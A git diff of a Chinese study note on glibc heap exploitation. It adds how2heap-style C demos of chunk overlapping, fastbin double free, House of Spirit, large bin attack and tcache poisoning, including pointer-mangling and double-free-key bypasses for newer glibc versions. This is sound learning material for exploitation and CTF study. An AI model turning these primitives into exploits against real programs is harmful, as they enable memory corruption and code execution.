@@ -7,19 +7,20 @@
     - [large bin](#large-bin)
     - [unsorted bin](#unsorted-bin)
     - [tcache bin( \>=glibc 2.26 )](#tcache-bin-glibc-226-)
+      - [tcache bin的安全机制](#tcache-bin的安全机制)
     - [top chunk](#top-chunk)
     - [last remainder](#last-remainder)
   - [漏洞](#漏洞)
     - [Chunk Extend and Overlapping](#chunk-extend-and-overlapping)
       - [对 inuse 的 chunk 进行 Extend](#对-inuse-的-chunk-进行-extend)
       - [对 free 的 chunk 进行 extend](#对-free-的-chunk-进行-extend)
-      - [通过 extend 后向 overlapping](#通过-extend-后向-overlapping)
+      - [通过 extend 进行 overlapping](#通过-extend-进行-overlapping)
     - [unlink](#unlink)
     - [Fastbin Attack](#fastbin-attack)
       - [Fastbin Double Free](#fastbin-double-free)
       - [House Of Spirit](#house-of-spirit)
       - [Alloc to Stack和Arbitrary Alloc](#alloc-to-stack和arbitrary-alloc)
-    - [unsorted bin attack(在glibc-2.28及其以后变得难以利用)](#unsorted-bin-attack在glibc-228及其以后变得难以利用)
+    - [unsorted bin attack](#unsorted-bin-attack)
     - [Large Bin Attack](#large-bin-attack)
     - [tcache bin](#tcache-bin)
       - [tcache poisoning](#tcache-poisoning)
@@ -27,7 +28,7 @@
       - [tcache perthread corruption](#tcache-perthread-corruption)
       - [tcache house of spirit](#tcache-house-of-spirit)
       - [tcache stashing unlink attack](#tcache-stashing-unlink-attack)
-    - [house of einherjar](#house-of-einherjar)
+    - [House of einherjar](#house-of-einherjar)
     - [House Of Force](#house-of-force)
     - [House of Lore](#house-of-lore)
     - [House of Orange](#house-of-orange)
@@ -172,6 +173,8 @@ int main()
 双向链表, 采用FIFO策略
 `large bins`中一共包括 `63`个 `bin`, 每个 `bin`中的 `chunk`的大小不一致, 处于一定区间范围内
 
+`large bin`的每个bin中会有存放不同大小的表, 表头的`fd`指针会指向相同或者下一个较小的表头, `fd_nextsize`会指向下一个较小的表头[large bin](./large%20bin.drawio)
+
 ### unsorted bin
 
 双向链表, 采用FIFO策略
@@ -182,8 +185,6 @@ int main()
 
 `tcache`是一个线程特定的数据结构, 每个线程都有自己的 `tcache`, 它包含了一组 `tcache bin`
 使用 `export GLIBC_TUNABLES=glibc.malloc.tcache_count=0`禁用 `tcache`
-在 `glibc 2.29` 版本中，引入了对 `tcache bin` 的`double free`检查，及检查`tcache_entry->key`
-在 `glibc 2.32` 版本中，引入了对 `tcache bin` 中 `chunk` 的 `next` 指针的加密，加密过程同[fastbin的安全机制](#fastbin的安全机制)
 注意，`tcache bin` 中 `chunk` 的 `next` 指向 `mem`
 
 - `tcache`的两个重要的结构体如下:
@@ -213,12 +214,20 @@ typedef struct tcache_perthread_struct
 } tcache_perthread_struct;
 ```
 
-1. 申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。
-2. 其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。
-3. 当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。
-4. tcache 取出：在内存申请的开始部分，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。
-5. 在循环处理 unsorted bin 内存块时，如果达到放入 unsorted bin 块最大数量，会立即返回。默认是 0，即不存在上限。
-6. 在循环处理 unsorted bin 内存块后，如果之前曾放入过 tcache 块，则会取出一个并返回。
+1. 申请的内存块符合 `fastbin` 大小时并且在 `fastbin` 内找到可用的空闲块时，会把该 `fastbin` 链上的其他内存块放入 `tcache` 中。
+2. 其次，申请的内存块符合 `smallbin` 大小时并且在 `smallbin` 内找到可用的空闲块时，会把该 `smallbin` 链上的其他内存块放入 `tcache` 中。
+3. 当在 `unsorted bin` 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 `tcache` 中，继续处理。
+4. `tcache` 取出：在内存申请的开始部分，首先会判断申请大小块，在 `tcache` 是否存在，如果存在就直接从 `tcache` 中摘取，否则再使用 `_int_malloc` 分配。
+5. 在循环处理 `unsorted bin` 内存块时，如果达到放入 `unsorted bin` 块最大数量，会立即返回。默认是 0，即不存在上限。
+6. 在循环处理 `unsorted bin` 内存块后，如果之前曾放入过 `tcache` 块，则会取出一个并返回。
+
+#### tcache bin的安全机制
+
+在 `glibc 2.29` 版本中，开始对 `tcache bin` 的`double free`检查，及检查`tcache_entry->key`
+
+在 `glibc 2.30` 版本中，开始在 `__libc_malloc` 从 `tcache bin` 中分配 `chunk` 时检查对应链上的 `count` 是否大于 `0`
+
+在 `glibc 2.32` 版本中，开始对 `tcache bin` 中 `chunk` 的 `next` 指针的加密，加密过程同[fastbin的安全机制](#fastbin的安全机制)
 
 ### top chunk
 
@@ -262,11 +271,10 @@ int main()
 
 #### 对 free 的 chunk 进行 extend
 
-和对 `inuse` 的 `chunk` 进行 `Extend` 原理基本一样
+与对 `inuse` 的 `chunk` 进行 `Extend` 原理基本一样
 注意，只适用于`glibc-2.29`之前的版本，`glibc-2.29`开始会在从`unsorted bin`取出`chunk`时对`size`, `prev_size` 和 `inuse` 进行检查
 
 ```C
-// 在glibc2.29中，对unsorted bin的size, prev_size和inuse都进行了检查
 // 此示例应当在glibc2.29之前的版本中运行
 #include <stdio.h>
 #include <stdlib.h>
@@ -290,7 +298,59 @@ int main()
 }
 ```
 
-#### 通过 extend 后向 overlapping
+#### 通过 extend 进行 overlapping
+
+通过 `extend` 向后 `overlapping`
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    size_t *p1, *p2;
+
+    p1 = malloc(0x10); // 分配第1个 0x10 的chunk1
+    malloc(0x10);      // 分配第2个 0x10 的chunk2
+    malloc(0x10);      // 分配第3个 0x10 的chunk3
+
+    *(p1 - 1) = 0x61;   // 修改chunk1的size为0x61
+    free(p1);           // 将其释放后放入0x61大小的tcache bin或fast bin中
+    p2 = malloc(0x50);  // 申请0x60大小的chunk将其分配出来，即可控制chunk2和chunk3内容
+
+    return 0;
+}
+```
+
+通过 `extend` 向前 `overlapping`
+`glibc-2.29`及其之后的`unlink`会检查`size`和`prev_size`是否相等, 利用起来更加麻烦
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void)
+{
+    size_t *p1, *p2;
+    p1 = malloc(0x80); // chunk1
+    malloc(0x10);      // chunk2
+    malloc(0x10);      // chunk3
+    p2 = malloc(0x80); // chunk4
+    malloc(0x10);      // 防止与top合并
+
+    free(p1); // 为unlink设置fd和bk
+
+    // 2.29及其之后的unlink会检查size和prev_size是否相等, 需要加上这段代码
+    *(p1 - 1) = 0x91 + 0x40;
+
+    *(p2 - 1) = 0x90;   // 修改inuse域
+    *(p2 - 2) = 0xd0;   // 修改pre_size域
+    free(p2);           // unlink进行前向extend
+    p2 = malloc(0x150); // 将chunk1, chunk2, chunk3, chunk4分配出来
+
+    return 0;
+}
+```
 
 ### unlink
 
@@ -370,6 +430,43 @@ unlink_chunk (mstate av, mchunkptr p)
 此时释放申请一个 `chunk`后修改 `chunk1`的 `fd`指向 `data`，然后再申请两次 `chunk`后，第三次申请 `chunk`即可获取 `data`
 __注意 `data`的 `size`必须满足当前 `fastbin`的大小__
 具体保护请见[fastbin的安全机制](#fastbin的安全机制)
+示例:
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+#define PROTECT_PTR(pos, ptr) \
+    ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
+#define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)
+
+int main(void)
+{
+    size_t stack[4];
+    size_t *chunk1, *chunk2;
+    printf("stack: %p\n", stack);
+
+    // 构建Fastbin Double Free
+    chunk1 = malloc(0x10);
+    chunk2 = malloc(0x10);
+    free(chunk1);
+    free(chunk2);
+    free(chunk1);
+
+    // 构建目标chunk
+    stack[0] = 0;
+    stack[1] = 0x21;
+
+    // 分配出目标chunk
+    chunk1 = malloc(0x10);                            // chunk1
+    *chunk1 = PROTECT_PTR(chunk1, (size_t)&stack[0]); // 修改chunk1->fd -> &chunk[0]
+    chunk2 = malloc(0x10);                            // chunk2
+    malloc(0x10);                                     // chunk1
+    printf("chunk: %p\n", malloc(0x10) - 0x10);       // stack
+
+    return 0;
+}
+```
 
 #### House Of Spirit
 
@@ -377,15 +474,62 @@ House Of Spirit指在目标位置伪造chunk，释放后重新申请然后控制
 伪造 `fake chunk`时需要注意:
 
 - `fake chunk` 的 `ISMMAP` 位不能为 `1`
-- `fake chunk` 地址需要对齐
+- `fake chunk` 地址需要对齐(`glibc 2.32`开始)
 - `fake chunk` 的 `size` 大小需要满足对应的 `fastbin` 的需求
-- `fake chunk` 的 `next chunk` 大小不能小于 `2 * SIZE_SZ`
+- `fake chunk` 的物理相邻的下一个chunk大小满足大于 `2 * SIZE_SZ` 且小于 `av->system_mem`
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    size_t fake_chunks[6];
+
+    fake_chunks[1] = 0x20; // size
+    fake_chunks[5] = 0x21; // 物理相连的chunk的size满足大于 2 * SIZE_SZ 且小于 av->system_mem
+
+    free(&fake_chunks[2]); // 将fake_chunks[2]加入到fast bin中
+    printf("fake_chunk : %p\n", malloc(0x10));
+
+    return 0;
+}
+```
 
 #### Alloc to Stack和Arbitrary Alloc
 
 劫持 `fastbin` 链表中 `chunk` 的 `fd` 指针，把 `fd` 指针指向我们想要分配的地方
 
-### unsorted bin attack(在glibc-2.28及其以后变得难以利用)
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+#define PROTECT_PTR(pos, ptr) \
+    ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
+#define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)
+
+int main()
+{
+    size_t fake_chunk[4] = {0};
+    size_t *p;
+
+    fake_chunk[1] = 0x21;                      // 设置size
+    fake_chunk[2] = REVEAL_PTR(fake_chunk[2]); // 将fd设置为0, printf可能会调用malloc_consolidate访问fd指向的chunk
+
+    p = malloc(0x10); // 向fast bin放入chunk
+    free(p);
+
+    *p = PROTECT_PTR(p, (size_t)&fake_chunk); // 将chunk的fd指向fake_chunk
+
+    malloc(0x10);
+    printf("fake_chunk : %p\n", malloc(0x10));
+
+    return 0;
+}
+
+```
+
+### unsorted bin attack
 
 ```C
 victim = unsorted_chunks (av)->bk;
@@ -395,23 +539,109 @@ unsorted_chunks (av)->bk = bck;
 bck->fd = unsorted_chunks (av);
 ```
 
-如果我们可以控制释放后 `chunk`的 `bk`指针指向我们想要的修改的数据的地址，申请空间后即可将该数据的值设置为 `main_arena`中的地址
+我们控制释放后放入`unsorted bin` 的 `chunk`的 `bk`指针指向`target - 0x10`的地方，申请空间将第一个`chunk`取出后即可将该数据的值设置为 `main_arena-bins - 0x10` 的地址
+
+__在glibc-2.28及其以后, 会检查`target`是否指向被取掉的`chunk`__
 
 ### Large Bin Attack
 
-glibc 从 2.26 版本开始引入了对 `large bin attack` 的防护
+修改任意地址的值为新放入chunk的地址
+
+示例1：
+
+```C
+// 从fd放入chunk
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    unsigned long stack_1 = 0;
+    unsigned long stack_2 = 0;
+
+    unsigned long *p1 = malloc(0x320);
+    malloc(0x20);
+    unsigned long *p2 = malloc(0x400);
+    malloc(0x20);
+    unsigned long *p3 = malloc(0x400);
+    malloc(0x20);
+
+    free(p1); // 用于将unsorted bin中的large bin大小的chunk放入large bin
+    free(p2); // 用于构造chunk
+
+    malloc(0x90); // 将构造chunk放入large bin
+
+    free(p3); // 向unsorted bin中放入chunk
+
+    p2[-1] = 0x3f1;                         // 构造chunk
+    p2[0] = 0;                              // fd
+    p2[1] = (unsigned long)(&stack_1 - 2);  // bk
+    p2[2] = 0;                              // fd_nextsize
+    p2[3] = (unsigned long)(&stack_2 - 4);  // bk_nextsize
+
+    malloc(0x90);
+
+    printf("stack_1 (%p): %p\n", &stack_1, (void *)stack_1);
+    printf("stack_2 (%p): %p\n", &stack_2, (void *)stack_2);
+
+    return 0;
+}
+```
+
+从 `glibc-2.30` 版本开始对`fd`插入的`chunk`的 __跳表指针__ 和 __双向链表指针__ 检查
+
+示例2：
+
+```C
+// 从bk放入chunk
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    unsigned long stack = 0;
+
+    unsigned long *p1 = malloc(0x320);
+    malloc(0x20);
+    unsigned long *p2 = malloc(0x400);
+    malloc(0x20);
+    unsigned long *p3 = malloc(0x400);
+    malloc(0x20);
+
+    free(p1); // 用于将unsorted bin中的large bin大小的chunk放入large bin
+    free(p2); // 用于构造chunk
+
+    malloc(0x90); // 将构造chunk放入large bin
+
+    free(p3); // 向unsorted bin中放入chunk
+
+    p2[-1] = 0x421;                         // 构造chunk
+    p2[0] = 0;                              // fd
+    p2[1] = 0;                              // bk
+    p2[2] = 0;                              // fd_nextsize
+    p2[3] = (unsigned long)(&stack - 4);    // bk_nextsize
+
+    malloc(0x90);
+
+    printf("stack (%p): %p\n", &stack, (void *)stack);
+
+    return 0;
+}
+```
+
+目前截止到 `glibc2.38` 依然可以使用
 
 ### tcache bin
 
 #### tcache poisoning
 
-修改 `tcache bin` 的 `next` 指针，使得 `malloc` 到任何地址
+修改 `tcache bin` 的 `next` 指针，使得可以 `malloc` 到任何地址
 需要注意:
 
 - 地址对齐
 - `next`指针指向的是 `mem`，而不是 `chunk`, 可以使用 `chunk2mem`进行转换
 - 注意在 `glibc 2.32`引入了对 `next`指针的加密, 同[fastbin的安全机制](#fastbin的安全机制)
-- `tcache bin`在取出 `chunk`时会使用 `count`检查对应 `tcache bin`链上是否有 `chunk`
+- `tcache bin`在取出 `chunk`时会使用 `count`检查对应 `tcache bin`链上是否有 `chunk`, 同[fastbin的安全机制](#fastbin的安全机制)
 
 如下:
 
@@ -420,21 +650,22 @@ glibc 从 2.26 版本开始引入了对 `large bin attack` 的防护
 #include <stdlib.h>
 // 加密
 #define PROTECT_PTR(pos, ptr) \
-  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
+    ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
+
+size_t fake_chunk;
 int main()
 {
-        size_t fake_chunk;
-        size_t *a = malloc(0x80);   // 将a指针指向fake_chunk
-        size_t *b = malloc(0x80);   // 用于tcache bin中count的计数
-        free(b);                    // 先将b指针放入tcache bin中使得count计数为1
-        free(a);
-        *a = PROTECT_PTR(a, &fake_chunk); // 将fake_chunk的地址加密后存入a[0]中
-        // tcache -> a -> fake_chunk
-        printf("%p\n", &fake_chunk);
-        printf("%p\n", malloc(0x80));   // 获取a
-        printf("%p\n", malloc(0x80));   // 获取fake_chunk
+    size_t *a = malloc(0x80); // 将a指针指向fake_chunk
+    size_t *b = malloc(0x80); // 用于tcache bin中count的计数
+    free(b);                  // 先将b指针放入tcache bin中使得count计数为1
+    free(a);
+    *a = (size_t)PROTECT_PTR(a, &fake_chunk); // 将fake_chunk的地址加密后存入a[0]中
+    // tcache -> a -> fake_chunk
+    printf("%p\n", &fake_chunk);
+    printf("%p\n", malloc(0x80)); // 获取a
+    printf("%p\n", malloc(0x80)); // 获取fake_chunk
 
-        return 0;
+    return 0;
 }
 ```
 
@@ -450,10 +681,10 @@ int main()
 int main()
 {
     char *a;
-    a = malloc(0x10);       // 申请一个chunk
-    free(a);                // 放入tcache bin
-    memset(a + 8, 0, 10);   // 修改key用于绕过tcache double free检查
-    free(a);                // 再次free
+    a = malloc(0x10);    // 申请一个chunk
+    free(a);             // 放入tcache bin
+    memset(a + 8, 0, 8); // 修改key用于绕过tcache double free检查
+    free(a);             // 再次free
 
     printf("a: %p\n", a);
     printf("new chunk: %p\n", malloc(0x10));
@@ -569,7 +800,7 @@ int main(){
 }
 ```
 
-### house of einherjar
+### House of einherjar
 
 和 `Chunk Extend and Overlapping`非常相似，但是 `Chunk Extend and Overlapping`绕过 `unlink`是将要合并的 `chunk`进行 `free`，这样才能将 `fd`和 `bk`设置为合适的值，`Chunk Extend and Overlapping`将 `fd`和 `bk`都指向了 `chunk`，这就需要提前知道将要合并的 `chunk`的地址，比如:
 `fake_chunk = p64(0x0) + p64(0x81) + p64(fake_chunk) + p64(fake_chunk)`
